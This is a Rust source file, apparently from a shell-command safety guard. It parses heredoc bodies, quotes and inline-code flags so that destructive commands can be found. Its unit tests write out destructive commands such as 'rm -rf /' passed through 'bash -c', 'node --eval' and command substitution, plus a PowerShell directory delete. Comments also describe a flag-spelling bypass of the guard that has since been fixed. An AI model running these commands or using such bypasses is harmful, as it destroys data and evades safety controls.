    for bodies in heredoc_body_layouts(command) {
        for body in bodies {
            openers.extend(
                body.range
                    .clone()
                    .filter(|&at| match bytes[at] {
                        b'\'' | b'"' | b'`' => true,
                        b'$' => matches!(bytes.get(at + 1), Some(b'(' | b'{' | b'[')),
                        b'(' => at > body.range.start && matches!(bytes[at - 1], b'<' | b'>'),
                        _ => false,
                    })
                    .map(|at| at..at + 1),
            );
        }
    }
    openers.sort_by_key(|range| range.start);
    merge_ranges(&openers)
}

/// The heredoc bodies of `command`, each with its terminator line: from the
/// start of the line after the one that holds its operator to the end of the
/// line that closes it (that line's newline excluded), or to the end of the
/// input when no line closes it. In input order, at most one per operator,
/// including bodies of operators inside `$(…)`, backquotes and process
/// substitutions; an operator inside a body belongs to the reading of that
/// body.
///
/// A body is raw text to the shell. A quote, `$(`, `${` or backquote in it
/// opens nothing, and the line after its terminator starts fresh. A reader
/// that tokenizes the whole command as shell takes an apostrophe in a body
/// line (`it's`) for a quote that runs to the end of the input, and every
/// command after the body for its contents.
///
/// Every `<<` (not `<<<`) outside quotes, comments and arithmetic that is
/// followed by a delimiter word is taken for an operator. Its body ends at the
/// first line that is exactly the delimiter after quote removal (after its
/// leading tabs for `<<-`), as `rules` reads bodies. The readers combine a
/// reading of the command with these bodies taken apart under each rule set
/// with their plain reading, so that text any of them shows stays shown: a
/// body found where the shell has none can show text, never hide it.
pub(crate) fn heredoc_body_ranges(
    command: &str,
    rules: HeredocRules,
) -> SmallVec<[HeredocBody; 2]> {
    let bytes = command.as_bytes();
    if memchr::memmem::find(bytes, b"<<").is_none() {
        return SmallVec::new();
    }
    let mut scanner = HeredocScanner {
        bytes,
        rules,
        bodies: SmallVec::new(),
        pending: Vec::new(),
    };
    scanner.code(0, HeredocCodeEnd::Input, 0);
    scanner.bodies
}

/// The heredoc body layouts of `command` a reader takes apart: bash's, and
/// dash's where it differs (see [`HeredocRules`]); a rule set that finds no
/// body adds none. Empty when there is no body.
pub(crate) fn heredoc_body_layouts(command: &str) -> SmallVec<[SmallVec<[HeredocBody; 2]>; 2]> {
    let mut layouts = SmallVec::new();
    let bash = heredoc_body_ranges(command, HeredocRules::Bash);
    let dash = heredoc_body_ranges(command, HeredocRules::Dash);
    if !dash.is_empty() && dash != bash {
        layouts.push(dash);
    }
    if !bash.is_empty() {
        layouts.push(bash);
    }
    layouts
}

/// The byte ranges that are heredoc body text (terminator lines included)
/// under every rule set, sorted and merged. A reader that leaves bodies out
/// leaves out only these: text one shell reads as a body may be commands to
/// another.
pub(crate) fn undisputed_heredoc_body_ranges(command: &str) -> SmallVec<[Range<usize>; 8]> {
    let ranges = |rules| -> SmallVec<[Range<usize>; 8]> {
        let mut ranges: SmallVec<[Range<usize>; 8]> = heredoc_body_ranges(command, rules)
            .into_iter()
            .map(|body| body.range)
            .collect();
        ranges.sort_by_key(|range| range.start);
        merge_ranges(&ranges)
    };
    let bash = ranges(HeredocRules::Bash);
    if bash.is_empty() {
        return bash;
    }
    intersect_ranges(&bash, &ranges(HeredocRules::Dash))
}

/// How a shell reads heredoc bodies. Bash and zsh read them alike; dash
/// differs on four points. With an unquoted delimiter, a body line ending in
/// a backslash-newline goes on to the next line in all of them, so `x\`
/// followed by `EOF` does not end an `EOF` body; bash and zsh compare the
/// joined line with the delimiter, so `E\` followed by `OF` ends one, while
/// dash ends a body only at a line of its own. Bash and zsh remove `$'…'` and
/// `$"…"` quoting from a delimiter, which dash keeps the `$` of. And bash and
/// zsh read `((…))` and `$[…]` as arithmetic, where a `<<` is a shift: dash
/// reads the first as nested subshells and the second as a word, and a `<<`
/// in either as an operator.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum HeredocRules {
    Bash,
    Dash,
}

/// One body found by [`heredoc_body_ranges`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct HeredocBody {
    /// The body with its terminator line.
    pub(crate) range: Range<usize>,
    /// Its operator is in the command's own code, not inside a substitution,
    /// so the body follows a line of its own.
    pub(crate) top_level: bool,
    /// The terminator's lines, when it is a line joined across
    /// backslash-newlines (see [`shell_parse_source`]).
    pub(crate) joined_terminator: Option<Range<usize>>,
}

/// A heredoc whose operator has been read and whose body starts on the line
/// after the next line end of the code that holds it.
struct PendingHeredoc {
    /// What the terminator line holds: the delimiter after quote removal.
    delimiter: Vec<u8>,
    /// `<<-`: leading tabs are stripped from each body and terminator line.
    strip_tabs: bool,
    /// The delimiter is unquoted, so a body line ending in a backslash-newline
    /// goes on to the next line.
    continues_lines: bool,
}

impl PendingHeredoc {
    fn is_terminator(&self, line: &[u8]) -> bool {
        let line = if self.strip_tabs {
            let tabs = line.iter().take_while(|byte| **byte == b'\t').count();
            &line[tabs..]
        } else {
            line
        };
        line == self.delimiter.as_slice()
    }
}

/// What ends the code a [`HeredocScanner::code`] call reads.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum HeredocCodeEnd {
    /// The end of the input.
    Input,
    /// The `)` that closes `$(`, `<(` or `>(`.
    Paren,
    /// The closing backquote.
    Backquote,
}

struct HeredocScanner<'a> {
    bytes: &'a [u8],
    rules: HeredocRules,
    bodies: SmallVec<[HeredocBody; 2]>,
    pending: Vec<PendingHeredoc>,
}

impl HeredocScanner<'_> {
    /// Read shell code from `start` to what `end` names, recording the bodies
    /// of the heredocs whose operators it holds. Returns the index just past
    /// the end (the closing byte included), or the input length.
    fn code(&mut self, start: usize, end: HeredocCodeEnd, depth: usize) -> usize {
        let bytes = self.bytes;
        let len = bytes.len();
        if depth > HEREDOC_SCAN_MAX_DEPTH {
            return len;
        }
        // Operators read in this code have their bodies in this code: one
        // still pending when it ends has none.
        let pending_floor = self.pending.len();
        let mut parens = 0usize;
        // Just past the `)` or `))` that closed a subshell or an arithmetic
        // command, where a word starts; a substitution's `)` ends no word.
        let mut group_end = usize::MAX;
        let mut i = start;
        while i < len {
            let byte = bytes[i];
            // Where a word starts, a `#` starts a comment and `((` an
            // arithmetic command.
            let word_start = i == start
                || i == group_end
                || matches!(
                    bytes[i - 1],
                    b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'(' | b'<' | b'>'
                );
            i = match byte {
                b'\n' if self.pending.len() > pending_floor => {
                    // Continue at the newline ending the last terminator line,
                    // read again as a plain line end.
                    self.read_bodies(i + 1, pending_floor, end == HeredocCodeEnd::Input)
                }
                b'\\' => (i + 2).min(len),
                b'\'' => memchr::memchr(b'\'', &bytes[i + 1..]).map_or(len, |at| i + at + 2),
                b'$' if bytes.get(i + 1) == Some(&b'\'') => skip_ansi_c_quoted(bytes, i + 2),
                b'$' if bytes.get(i + 1) == Some(&b'"') => self.double_quoted(i + 2, depth + 1),
                b'"' => self.double_quoted(i + 1, depth + 1),
                b'$' if bytes.get(i + 1) == Some(&b'(') => self.substitution(i, depth + 1),
                b'<' | b'>' if bytes.get(i + 1) == Some(&b'(') => {
                    self.code(i + 2, HeredocCodeEnd::Paren, depth + 1)
                }
                b'$' if bytes.get(i + 1) == Some(&b'{') => self.braced(i + 2, depth + 1),
                b'$' if self.rules == HeredocRules::Bash && bytes.get(i + 1) == Some(&b'[') => {
                    bracket_arithmetic_end(bytes, i + 2)
                }
                b'`' if end == HeredocCodeEnd::Backquote => {
                    self.pending.truncate(pending_floor);
                    return i + 1;
                }
                b'`' => self.code(i + 1, HeredocCodeEnd::Backquote, depth + 1),
                b'<' => {
                    let run = bytes[i..].iter().take_while(|b| **b == b'<').count();
                    if run == 2 { self.operator(i) } else { i + run }
                }
                b'#' if word_start => {
                    // To the end of its line, or inside backquotes to the
                    // closing backquote if that comes first.
                    let line_end = memchr::memchr(b'\n', &bytes[i..]).map_or(len, |at| i + at);
                    if end == HeredocCodeEnd::Backquote {
                        memchr::memchr(b'`', &bytes[i..line_end]).map_or(line_end, |at| i + at)
                    } else {
                        line_end
                    }
                }
                b'(' => {
                    if word_start
                        && self.rules == HeredocRules::Bash
                        && bytes.get(i + 1) == Some(&b'(')
                        && let Some(close) = arithmetic_end(bytes, i + 2)
                    {
                        group_end = close;
                        close
                    } else {
                        parens += 1;
                        i + 1
                    }
                }
                b')' if end == HeredocCodeEnd::Paren && parens == 0 => {
                    self.pending.truncate(pending_floor);
                    return i + 1;
                }
                b')' => {
                    parens = parens.saturating_sub(1);
                    group_end = i + 1;
                    i + 1
                }
                _ => i + 1,
            };
        }
        self.pending.truncate(pending_floor);
        len
    }

    /// Read a double-quoted string whose text starts at `start`; returns the
    /// index past its closing quote. Its substitutions are code.
    fn double_quoted(&mut self, start: usize, depth: usize) -> usize {
        let bytes = self.bytes;
        let len = bytes.len();
        let mut i = start;
        while i < len {
            i = match bytes[i] {
                b'"' => return i + 1,
                b'\\' => (i + 2).min(len),
                b'$' if bytes.get(i + 1) == Some(&b'(') => self.substitution(i, depth + 1),
                b'$' if bytes.get(i + 1) == Some(&b'{') => self.braced(i + 2, depth + 1),
                b'`' => self.code(i + 1, HeredocCodeEnd::Backquote, depth + 1),
                _ => i + 1,
            };
        }
        len
    }

    /// Read the `$(…)` or `$((…))` whose `$` is at `at`; returns the index
    /// past it.
    fn substitution(&mut self, at: usize, depth: usize) -> usize {
        let bytes = self.bytes;
        (bytes.get(at + 2) == Some(&b'('))
            .then(|| arithmetic_end(bytes, at + 3))
            .flatten()
            .unwrap_or_else(|| self.code(at + 2, HeredocCodeEnd::Paren, depth))
    }

    /// Read a `${…}` expansion whose text starts at `start`, as
    /// [`consume_braced_parameter`] does; returns the index past its `}`.
    fn braced(&mut self, start: usize, depth: usize) -> usize {
        let bytes = self.bytes;
        let len = bytes.len();
        let mut nesting = 1usize;
        let mut i = start;
        while i < len {
            i = match bytes[i] {
                b'\\' => (i + 2).min(len),
                b'$' if bytes.get(i + 1) == Some(&b'{') => {
                    nesting += 1;
                    i + 2
                }
                b'$' if bytes.get(i + 1) == Some(&b'\'') => skip_ansi_c_quoted(bytes, i + 2),
                b'}' => {
                    nesting -= 1;
                    if nesting == 0 {
                        return i + 1;
                    }
                    i + 1
                }
                b'\'' => memchr::memchr(b'\'', &bytes[i + 1..]).map_or(len, |at| i + at + 2),
                b'"' => self.double_quoted(i + 1, depth + 1),
                b'$' if bytes.get(i + 1) == Some(&b'(') => self.substitution(i, depth + 1),
                b'`' => self.code(i + 1, HeredocCodeEnd::Backquote, depth + 1),
                _ => i + 1,
            };
        }
        len
    }

    /// Read the heredoc operator whose `<<` is at `at`, and its delimiter
    /// word; returns the index past them. A word quoted in any part, or with a
    /// backslash, makes the delimiter quoted; a line continuation is removed
    /// before the word is read, as the shell removes it.
    fn operator(&mut self, at: usize) -> usize {
        let bytes = self.bytes;
        let len = bytes.len();
        let continuation = |i: usize| bytes[i] == b'\\' && bytes.get(i + 1) == Some(&b'\n');
        let mut i = at + 2;
        let strip_tabs = bytes.get(i) == Some(&b'-');
        if strip_tabs {
            i += 1;
        }
        while i < len && (matches!(bytes[i], b' ' | b'\t') || continuation(i)) {
            i += if continuation(i) { 2 } else { 1 };
        }
        let word_start = i;
        if bytes.get(i) == Some(&b'#') {
            // A comment, where the word would start: a syntax error, not an
            // operator.
            return word_start;
        }
        // The delimiter is the word after quote removal; the shell does not
        // expand it. A carriage return is no blank, so it stays in the word.
        let mut delimiter = Vec::new();
        let mut quoted = false;
        while i < len {
            match bytes[i] {
                b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'(' | b')' | b'<' | b'>' => break,
                b'\\' if continuation(i) => i += 2,
                b'\\' => {
                    quoted = true;
                    delimiter.extend(bytes.get(i + 1));
                    i = (i + 2).min(len);
                }
                b'\'' => {
                    quoted = true;
                    let close = memchr::memchr(b'\'', &bytes[i + 1..]).map_or(len, |at| i + 1 + at);
                    delimiter.extend_from_slice(&bytes[i + 1..close]);
                    i = (close + 1).min(len);
                }
                b'$' if matches!(bytes.get(i + 1), Some(b'\'' | b'"')) => {
                    quoted = true;
                    let quote = bytes[i + 1];
                    let mut close = i + 2;
                    while close < len && bytes[close] != quote {
                        close += if bytes[close] == b'\\' { 2 } else { 1 };
                    }
                    let close = close.min(len);
                    let text = &bytes[i + 2..close];
                    if self.rules == HeredocRules::Dash {
                        delimiter.push(b'$');
                        delimiter.extend_from_slice(text);
                    } else {
                        // Each escape stands for its character; the common
                        // ones (`\'`, `\"`, `\\`) for the escaped byte.
                        let mut escaped = false;
                        for &byte in text {
                            if escaped || byte != b'\\' {
                                delimiter.push(byte);
                                escaped = false;
                            } else {
                                escaped = true;
                            }
                        }
                    }
                    i = (close + 1).min(len);
                }
                b'"' => {
                    quoted = true;
                    i += 1;
                    while i < len && bytes[i] != b'"' {
                        if continuation(i) {
                            i += 2;
                            continue;
                        }
                        if bytes[i] == b'\\'
                            && matches!(bytes.get(i + 1), Some(b'$' | b'`' | b'"' | b'\\'))
                        {
                            i += 1;
                        }
                        delimiter.push(bytes[i]);
                        i += 1;
                    }
                    i = (i + 1).min(len);
                }
                byte => {
                    delimiter.push(byte);
                    i += 1;
                }
            }
        }
        if i == word_start {
            // `<<` with no word after it is a syntax error, not an operator.
            return word_start;
        }
        self.pending.push(PendingHeredoc {
            delimiter,
            strip_tabs,
            continues_lines: !quoted,
        });
        i
    }

    /// Read the bodies of the heredocs pending above `pending_floor`, one
    /// after the other from `start`, the first line after the line end that
    /// holds their operators. Returns the index of the newline ending the last
    /// terminator line, or the input length.
    fn read_bodies(&mut self, start: usize, pending_floor: usize, top_level: bool) -> usize {
        let len = self.bytes.len();
        let mut body_start = start;
        for heredoc in self.pending.split_off(pending_floor) {
            let (end, joined_terminator) = self.body_end(body_start, &heredoc);
            if end > body_start {
                self.bodies.push(HeredocBody {
                    range: body_start..end,
                    top_level,
                    joined_terminator,
                });
            }
            if end >= len {
                return len;
            }
            body_start = end + 1;
        }
        body_start - 1
    }

    /// End of the terminator line of the body that starts at `start` (its
    /// newline excluded), or the input length when no line ends it; and the
    /// terminator's lines when it is a line joined across backslash-newlines.
    fn body_end(&self, start: usize, heredoc: &PendingHeredoc) -> (usize, Option<Range<usize>>) {
        let bytes = self.bytes;
        let len = bytes.len();
        let line_end_from =
            |from: usize| memchr::memchr(b'\n', &bytes[from..]).map_or(len, |at| from + at);
        let continues = |line: &[u8]| {
            heredoc.continues_lines
                && line.iter().rev().take_while(|byte| **byte == b'\\').count() % 2 == 1
        };
        let mut line_start = start;
        loop {
            let mut line_end = line_end_from(line_start);
            let joined_line = continues(&bytes[line_start..line_end]);
            let terminates = if joined_line {
                // One line, joined across each backslash-newline: bash and zsh
                // compare it with the delimiter, dash ends no body at it. Past
                // the delimiter's length it can no longer be the delimiter, but
                // its end is still where the next line starts.
                let limit = heredoc.delimiter.len() + 1;
                let mut joined = Vec::new();
                let mut piece_start = line_start;
                loop {
                    let piece = &bytes[piece_start..line_end];
                    let more = continues(piece) && line_end < len;
                    let kept = if more {
                        &piece[..piece.len() - 1]
                    } else {
                        piece
                    };
                    if joined.len() <= limit {
                        joined.extend_from_slice(kept);
                    }
                    if !more {
                        break;
                    }
                    piece_start = line_end + 1;
                    line_end = line_end_from(piece_start);
                }
                self.rules == HeredocRules::Bash
                    && joined.len() <= limit
                    && heredoc.is_terminator(&joined)
            } else {
                heredoc.is_terminator(&bytes[line_start..line_end])
            };
            if terminates {
                return (line_end, joined_line.then_some(line_start..line_end));
            }
            if line_end >= len {
                return (len, None);
            }
            line_start = line_end + 1;
        }
    }
}

/// `command` as a parser of shell syntax should read it. tree-sitter-bash
/// ends a heredoc body at a raw line that is its delimiter, while bash and
/// zsh, for an unquoted delimiter, compare a line joined across
/// backslash-newlines (`E\` followed by `OF` ends an `EOF` body) and run the
/// lines after it; read raw, those lines were body text to every analysis
/// that starts from the parse tree. Each such terminator is written out
/// joined, the backslash-newlines it drops moved after it as empty lines, so
/// the parse ends the body where the shell does. Every other byte, and every
/// offset outside those terminators, is the command's own.
#[must_use]
pub(crate) fn shell_parse_source(command: &str) -> Cow<'_, str> {
    if memchr::memmem::find(command.as_bytes(), b"\\\n").is_none() {
        return Cow::Borrowed(command);
    }
    let terminators: SmallVec<[Range<usize>; 2]> = heredoc_body_ranges(command, HeredocRules::Bash)
        .into_iter()
        .filter_map(|body| body.joined_terminator)
        .collect();
    if terminators.is_empty() {
        return Cow::Borrowed(command);
    }
    let mut bytes = command.as_bytes().to_vec();
    for range in terminators {
        // An unquoted delimiter holds no backslash, so every one in the
        // joined terminator ends one of its lines.
        let mut line: Vec<u8> = command.as_bytes()[range.clone()]
            .split(|byte| *byte == b'\n')
            .flat_map(|piece| piece.strip_suffix(b"\\").unwrap_or(piece))
            .copied()
            .collect();
        line.resize(range.len(), b'\n');
        bytes[range].copy_from_slice(&line);
    }
    // Only ASCII bytes were moved, between whole lines.
    String::from_utf8(bytes).map_or(Cow::Borrowed(command), Cow::Owned)
}

/// Index past the `]` closing the `$[…]` arithmetic whose text starts at
/// `start`, where a `<<` is a shift (bash and zsh), or the input length when
/// none does: the shell reads on for it and reports a syntax error.
fn bracket_arithmetic_end(bytes: &[u8], start: usize) -> usize {
    let mut depth = 0usize;
    let mut i = start;
    while i < bytes.len() {
        i = match bytes[i] {
            b'[' => {
                depth += 1;
                i + 1
            }
            b']' if depth == 0 => return i + 1,
            b']' => {
                depth -= 1;
                i + 1
            }
            b'\\' => i + 2,
            b'\'' => memchr::memchr(b'\'', &bytes[i + 1..]).map_or(bytes.len(), |at| i + at + 2),
            b'"' => {
                let mut at = i + 1;
                while at < bytes.len() && bytes[at] != b'"' {
                    at += if bytes[at] == b'\\' { 2 } else { 1 };
                }
                at + 1
            }
            _ => i + 1,
        };
    }
    bytes.len()
}

/// Index past the `$'…'` string whose text starts at `start`.
fn skip_ansi_c_quoted(bytes: &[u8], start: usize) -> usize {
    let mut i = start;
    while i < bytes.len() && bytes[i] != b'\'' {
        i += if bytes[i] == b'\\' { 2 } else { 1 };
    }
    (i + 1).min(bytes.len())
}

/// Index past the `))` closing the arithmetic whose text starts at `start`
/// (after `$((` or `((`), where a `<<` is a shift. As bash decides it, the
/// text is arithmetic only when the `)` that closes its own level is followed
/// at once by another `)`; otherwise (`((cd x) && ls)`) the parentheses open
/// nested subshells, and `None` is returned.
fn arithmetic_end(bytes: &[u8], start: usize) -> Option<usize> {
    let mut depth = 0usize;
    let mut i = start;
    while i < bytes.len() {
        i = match bytes[i] {
            b'(' => {
                depth += 1;
                i + 1
            }
            b')' if depth == 0 => {
                return (bytes.get(i + 1) == Some(&b')')).then_some(i + 2);
            }
            b')' => {
                depth -= 1;
                i + 1
            }
            b'\\' => i + 2,
            b'\'' => memchr::memchr(b'\'', &bytes[i + 1..]).map_or(bytes.len(), |at| i + at + 2),
            b'"' => {
                let mut at = i + 1;
                while at < bytes.len() && bytes[at] != b'"' {
                    at += if bytes[at] == b'\\' { 2 } else { 1 };
                }
                at + 1
            }
            _ => i + 1,
        };
    }
    None
}

#[inline]
#[must_use]
fn is_inline_code_flag(word: &str) -> bool {
    if word == "-S" {
        return true;
    }
    // The long spellings of the same flags (#425). A `--` word used to be
    // rejected outright, which made `node --eval '<payload>'` a one-word bypass
    // of the `node -e '<payload>'` deny — verified live against real node and
    // bun, both of which honour `--eval` and `--print`.
    //
    // Matched by NAME rather than by the letter scan below, because `--` words
    // are overwhelmingly ordinary options: scanning the value of every one of
    // them as code would widen this far past interpreters. The `=` spelling is
    // handled by taking the part before it, so `--eval=<payload>` counts too.
    if let Some(name) = word.strip_prefix("--") {
        let name = name.split('=').next().unwrap_or(name);
        return matches!(name, "eval" | "print" | "command" | "run" | "execute");
    }
    if !word.starts_with('-') || word.len() < 2 {
        return false;
    }

    // `p` covers the SHORT `-p` of Node and Bun, which evaluates its argument
    // exactly as `-e` does and then prints the result (issue #397). This is only
    // a cheap pre-filter: `check_inline_code_context` still requires the
    // segment's executable to be one of `inline_code_commands`, so `cp -p`,
    // `mkdir -p`, and `rsync -p` are untouched. Over-classifying an
    // interpreter's argument as code only widens what gets scanned, which is the
    // safe direction for a guard — and it is the same reason the long-flag list
    // above carries names (`command`, `run`, `execute`) that no interpreter dcg
    // models actually accepts today. A command using one of those errors out, so
    // reading its argument costs a wasted scan and nothing else.
    word.as_bytes()
        .iter()
        .skip(1)
        .any(|b| matches!(b.to_ascii_lowercase(), b'c' | b'e' | b'p' | b'r'))
}

#[must_use]
fn segment_start_before_flag(command: &str, flag_start: usize) -> usize {
    let bytes = command.as_bytes();
    let mut i = flag_start.min(bytes.len());

    while i > 0 {
        i -= 1;
        match bytes[i] {
            b'|' => {
                if i > 0 && bytes[i - 1] == b'|' {
                    return i + 1;
                }
                return i + 1;
            }
            b'&' => {
                if i > 0 && bytes[i - 1] == b'&' {
                    return i + 1;
                }
                return i + 1;
            }
            b';' => return i + 1,
            _ => {}
        }
    }

    0
}

#[must_use]
fn merge_ranges(ranges: &[Range<usize>]) -> SmallVec<[Range<usize>; 8]> {
    let mut merged: SmallVec<[Range<usize>; 8]> = SmallVec::new();
    for range in ranges {
        if let Some(last) = merged.last_mut() {
            if range.start <= last.end {
                last.end = last.end.max(range.end);
                continue;
            }
        }
        merged.push(range.clone());
    }
    merged
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The interpreter search behind an inline-code flag reads each word of a
    /// segment once, however many flags the segment holds, and still resets
    /// at a segment boundary.
    #[test]
    fn inline_code_flags_are_found_in_linear_time_and_per_segment() {
        let inline = |command: &str| {
            classify_command(command)
                .spans()
                .iter()
                .any(|span| span.kind == SpanKind::InlineCode)
        };
        assert!(inline("sh -c 'git status'"));
        assert!(inline("env -S 'git status'"));
        assert!(inline(&format!("{}sh -c 'x'", "c -c ".repeat(5_000))));
        assert!(!inline(&format!("{}grep -c 'x' f", "c -c ".repeat(5_000))));
        assert!(!inline("sh -x script; grep -c 'x' f"));
        assert!(!inline("env A=1 true; grep -S 'x' f"));
        assert!(inline("true; env -S 'x'"));
    }

    #[test]
    fn test_simple_command() {
        let spans = classify_command("git status");
        assert_eq!(spans.spans().len(), 1);
        assert_eq!(spans.spans()[0].kind, SpanKind::Executed);
    }

    #[test]
    fn test_single_quoted_string() {
        let cmd = "git commit -m 'Fix rm -rf detection'";
        let spans = classify_command(cmd);

        // Should have: "git commit -m " (Executed), "'Fix rm -rf detection'" (Data)
        assert!(spans.spans().len() >= 2);

        // Find the single-quoted span
        let data_span = spans.spans().iter().find(|s| s.kind == SpanKind::Data);
        assert!(data_span.is_some());
        let data_span = data_span.unwrap();
        assert_eq!(data_span.text(cmd), "'Fix rm -rf detection'");
    }

    #[test]
    fn test_double_quoted_string() {
        let cmd = "echo \"hello world\"";
        let spans = classify_command(cmd);

        // Find the double-quoted span
        let arg_span = spans.spans().iter().find(|s| s.kind == SpanKind::Argument);
        assert!(arg_span.is_some());
        assert_eq!(arg_span.unwrap().text(cmd), "\"hello world\"");
    }

    #[test]
    fn test_unclosed_single_quote_is_unknown() {
        let cmd = "echo 'rm -rf /";
        let spans = classify_command(cmd);

        let last_span = spans.spans().last().expect("last span");
        assert_eq!(last_span.kind, SpanKind::Unknown);
        assert!(last_span.text(cmd).contains("rm -rf"));
    }

    #[test]
    fn test_comment_at_eof_is_comment_span() {
        let cmd = "echo safe # rm -rf /";
        let spans = classify_command(cmd);

        let comment_span = spans.spans().iter().find(|s| s.kind == SpanKind::Comment);
        assert!(comment_span.is_some());
        assert_eq!(comment_span.unwrap().text(cmd), "# rm -rf /");
    }

    #[test]
    fn test_comment_after_separator_is_comment_span() {
        let cmd = "echo safe;# rm -rf /";
        let spans = classify_command(cmd);

        let comment_span = spans.spans().iter().find(|s| s.kind == SpanKind::Comment);
        assert!(comment_span.is_some());
        assert_eq!(comment_span.unwrap().text(cmd), "# rm -rf /");
    }

    #[test]
    fn test_powershell_block_comment_is_comment_span() {
        // PowerShell `<# ... #>` block comment: body must be classified Comment so a
        // destructive string printed inside it does not block (.9.7).
        let cmd = r"echo safe <# rm -rf / #> done";
        let spans = classify_command(cmd);
        let comment = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::Comment)
            .expect("block comment should produce a Comment span");
        assert_eq!(comment.text(cmd), "<# rm -rf / #>");
        // The destructive text must NOT appear in any Executed span.
        assert!(
            !spans
                .spans()
                .iter()
                .any(|s| s.kind == SpanKind::Executed && s.text(cmd).contains("rm -rf")),
            "destructive text leaked into an Executed span"
        );
    }

    #[test]
    fn embedded_lt_hash_is_not_a_powershell_block_comment() {
        let cmd = r#"Write-Output<#; [IO.Directory]::Delete("C:\src", $true); #>"#;
        let spans = classify_command(cmd);

        assert!(
            !spans
                .spans()
                .iter()
                .any(|span| span.kind == SpanKind::Comment && span.text(cmd).starts_with("<#")),
            "an embedded <# is part of a PowerShell token, not a comment: {spans:?}"
        );
        assert!(
            spans.spans().iter().any(|span| {
                span.kind == SpanKind::Executed && span.text(cmd).contains("[IO.Directory]::Delete")
            }),
            "the executable delete after an embedded <# must remain visible: {spans:?}"
        );
    }

    #[test]
    fn test_powershell_block_comment_unterminated_runs_to_eof() {
        let cmd = r"echo safe <# rm -rf / never closed";
        let spans = classify_command(cmd);
        let comment = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::Comment)
            .expect("unterminated block comment should still be a Comment span");
        assert!(comment.text(cmd).starts_with("<# rm -rf /"));
    }

    #[test]
    fn test_powershell_block_comment_lt_hash_gt_is_unterminated() {
        // `<#>` opens a block comment whose terminator (`#>`) never appears — the
        // opener's own `#` must NOT be reused as the terminator. So everything from
        // `<#` to EOF is a Comment, and the destructive tail is never Executed.
        let cmd = r"echo a <#> rm -rf /";
        let spans = classify_command(cmd);
        let comment = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::Comment)
            .expect("`<#>` should open an unterminated Comment span");
        assert!(comment.text(cmd).starts_with("<#>"));
        assert!(
            !spans
                .spans()
                .iter()
                .any(|s| s.kind == SpanKind::Executed && s.text(cmd).contains("rm -rf")),
            "the tail after `<#>` must not be Executed"
        );
    }

    #[test]
    fn test_powershell_empty_block_comment_lt_hash_hash_gt() {
        // `<##>` is a complete, empty block comment (terminator is the 2nd `#` + `>`).
        let cmd = r"echo a <##> echo b";
        let spans = classify_command(cmd);
        let comment = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::Comment)
            .expect("`<##>` should be a complete Comment span");
        assert_eq!(comment.text(cmd), "<##>");
    }

    #[test]
    fn test_command_substitution() {
        let cmd = "echo $(rm -rf /)";
        let spans = classify_command(cmd);

        // Should have InlineCode span for $(rm -rf /)
        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(inline_span.is_some());
        assert_eq!(inline_span.unwrap().text(cmd), "$(rm -rf /)");
    }

    #[test]
    fn test_backtick_substitution() {
        let cmd = "echo `rm -rf /`";
        let spans = classify_command(cmd);

        // Should have InlineCode span for `rm -rf /`
        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(inline_span.is_some());
        assert_eq!(inline_span.unwrap().text(cmd), "`rm -rf /`");
    }

    #[test]
    fn test_env_split_string_marks_inline_code() {
        let cmd = "env FOO=1 -S \"rm -rf /\"";
        let spans = classify_command(cmd);

        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(inline_span.is_some());
        assert_eq!(inline_span.unwrap().text(cmd), "\"rm -rf /\"");
    }

    #[test]
    fn test_pipe() {
        let cmd = "echo hi | cat";
        let spans = classify_command(cmd);

        // Should have spans for: "echo hi ", "|", " cat"
        assert!(spans.spans().len() >= 2);

        // All parts around pipe should be Executed
        for span in spans.executable_spans() {
            assert!(span.kind.is_executable());
        }
    }

    #[test]
    fn test_semicolon_separator() {
        let cmd = "echo a; echo b";
        let spans = classify_command(cmd);

        // Both parts should be Executed
        assert!(spans.has_executable_content());
    }

    #[test]
    fn test_and_separator() {
        let cmd = "true && rm -rf /";
        let spans = classify_command(cmd);

        // Both parts should be Executed
        let executable_text: Vec<_> = spans.executable_text(cmd);
        assert!(!executable_text.is_empty());
    }

    #[test]
    fn test_bash_c_inline_code() {
        let cmd = "bash -c \"rm -rf /\"";
        let spans = classify_command(cmd);

        // The quoted part after -c should be InlineCode
        let inline_span = spans
            .spans()
            .iter()
            .find(|s| s.kind == SpanKind::InlineCode);
        assert!(
            inline_span.is_some(),
            "Should detect inline code after bash -c"
        );
    }

    /// The LONG spellings of the inline-code flags classify their argument as
    /// code, just as the short ones do (issue #425).
    ///
    /// Regression: every `--` word was rejected before the flag scan ran, so
    /// `node --eval '<payload>'` was a one-word bypass of the `node -e
    /// '<payload>'` deny. Verified live: real node and bun both honour `--eval`
    /// and `--print`.
    #[test]
    fn long_inline_code_flags_classify_their_argument_as_code() {
        for command in [
            "node --eval 'rm -rf /'",
            "node --print 'rm -rf /'",
            "node --eval='rm -rf /'",
            "bun --eval 'rm -rf /'",
            "php --run 'rm -rf /'",
            // Short spellings must keep working.
            "node -e 'rm -rf /'",
            "node -p 'rm -rf /'",
        ] {
            let spans = classify_command(command);
            assert!(
                spans
                    .spans()
                    .iter()
                    .any(|span| span.kind == SpanKind::InlineCode),
                "the flag argument is code: {command:?}"
            );
        }
    }

    /// The long-flag names are matched exactly, so an ordinary `--` option does
    /// not turn its value into code. `check_inline_code_context` also requires
    /// the executable to be an interpreter, but the flag test should not be the
    /// thing relying on that.
    #[test]
    fn an_ordinary_long_option_is_not_an_inline_code_flag() {
        for word in [
            "--version",
            "--help",
            "--experimental-modules",
            "--recursive",
            "--exec-path",
            "--evaluate",
            "--printer",
            "--runtime",
            "--commands",
        ] {
            assert!(
                !is_inline_code_flag(word),
                "{word:?} must not be read as an inline-code flag"
            );
        }
        for word in ["--eval", "--print", "--command", "--run", "--execute"] {
